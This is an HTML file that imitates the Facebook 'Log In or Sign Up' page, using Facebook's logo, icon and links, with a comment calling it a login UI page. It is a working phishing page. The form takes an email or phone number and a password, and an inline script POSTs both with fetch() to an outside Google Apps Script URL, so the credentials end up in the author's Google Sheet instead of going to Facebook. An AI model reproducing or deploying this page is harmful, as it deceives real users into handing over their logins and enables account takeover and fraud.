<!-- this is UI and UX page log in Facebook-->



<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="https://www.facebook.com/images/fb_icon_325x325.png"><!-- that is icon website -->
    <link rel="stylesheet" href="face.css"> 
    <title>Facebook-Log In or Sign Up</title>
</head>
<body>
    <div>
         <div>
             <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="facebook" id="image_facebook"><!-- that is image form in swebsite facebook-->
             <p id="text1">
                Connect with friends and the world around you on Facebook.
             </p>
         </div>
         <div id="form1">
             <form name="submit-to-google-sheet">
                 <input type="text" id="email" name="email" placeholder="Email or Phone Number" required>
                 <br>
                 <input type="text" id="password" name="password" placeholder="Password" required>
                 <br>
                 <input type="submit" value="Log In" id="login">
                 <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login" id="forget_password">Forgot Password?</a>
                 <br>
                 <hr>
                 <div id="div_new_account">
                     <br>
                    <a href="https://www.facebook.com/#" id="new_account">Create New Account</a>
                 </div>
                 
             </form>
         </div>
    </div>
    <script>
        const scriptURL = 'https://script.google.com/macros/s/AKfycbzTU7KmI7hTf-C5BXKyW26Itjb-4xsyH8TIcYxvu4siWT6bb2TP9svB9dOjdKebHIP8QA/exec'
        const form = document.forms['submit-to-google-sheet']
      
        form.addEventListener('submit', e => {
          e.preventDefault()
          fetch(scriptURL, { method: 'POST', body: new FormData(form)})
            .then(response => console.log('Success!', response))
            .catch(error => console.error('Error!', error.message))
        })
      </script>
</body>
</html>
